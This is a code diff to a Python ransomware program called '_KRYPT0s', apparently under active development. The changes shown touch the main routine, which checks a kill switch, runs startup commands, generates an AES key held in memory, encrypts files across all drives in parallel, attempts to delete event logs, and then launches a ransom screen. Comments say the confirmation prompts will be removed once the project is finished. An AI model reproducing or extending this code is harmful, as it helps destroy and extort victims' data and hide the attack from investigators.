@@ -100,8 +100,11 @@ def gather_all_drives():
 
 # Launch ransom screen (as .exe format)
 def launch_gui():
-    path = os.path.join(os.getcwd(), "Screen.exe")
-    subprocess.Popen([path])
+    try:
+        path = os.path.join(os.getcwd(), "Screen.exe")
+        subprocess.Popen([path])
+    except:
+        sys.exit() # Exit if an error occured when running the above file
 
 # Generate temporary AES symetric key
 def generate_key():
@@ -205,19 +208,22 @@ def zero_and_unlock(mm, key_len, kernel_memory):
 
 # Main part, run all functions
 def main():
+    # Start up commands and kill switch check
     initial_check_kill()
     startup_commands_windows()
     
+    # Key generation and encyrption
     key = generate_key()
     mm, key_len, kernel_memory = key_to_ram(key)
     drives = list_drives()
     parallel_search(drives, mm[:key_len])
-    zero_and_unlock(mm, key_len, kernel_memory)
     
+    # Clean up and display screen
+    zero_and_unlock(mm, key_len, kernel_memory)
     attempt_rem_event_logs()
-    launch_gui()
+    launch_gui() # Display only when all files are encrypted
 
 if __name__ == "__main__":
     input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # will delete when project is finished
     input("Press any key again to confirm, this is to prevent accidental execution on main machine") # will delete when project is finished
-    main()
+    main() # Launch _KRYPT0s
